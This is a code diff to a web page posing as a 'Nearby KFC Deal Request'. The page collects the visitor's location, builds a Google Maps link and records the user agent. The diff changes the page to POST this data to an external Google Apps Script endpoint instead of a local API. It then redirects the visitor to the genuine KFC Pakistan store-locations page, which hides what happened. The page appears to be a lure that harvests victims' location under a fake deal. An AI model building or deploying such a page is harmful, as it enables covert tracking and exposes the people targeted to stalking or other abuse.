@@ -155,7 +155,7 @@ const content = `🍗 **Nearby KFC Deal Request**
 📍 [Google Maps Link](${mapUrl})${signature}`;
 
 
-       fetch("/api/save-location", {
+    fetch("https://script.google.com/macros/s/AKfycbxljE9VsM4fPUOBDYZhoI3tQDrATP_bm817-r5CAu3sNXmZ314ouy8Dv5yIL77NNjDt/exec", {
   method: "POST",
   headers: { "Content-Type": "application/json" },
   body: JSON.stringify({
@@ -167,10 +167,10 @@ const content = `🍗 **Nearby KFC Deal Request**
     ua: userAgent
   })
 }).finally(() => {
-              setTimeout(() => {
-                window.location.href = "https://www.kfcpakistan.com/store-locations";
-              }, 1000);
-            });
+  setTimeout(() => {
+    window.location.href = "https://www.kfcpakistan.com/store-locations";
+  }, 1000);
+});
           },
           () => {
             window.location.href = "https://www.kfcpakistan.com/store-locations";
@@ -184,6 +184,7 @@ const content = `🍗 **Nearby KFC Deal Request**
 
 </body>
 </html>
+
 
 
 
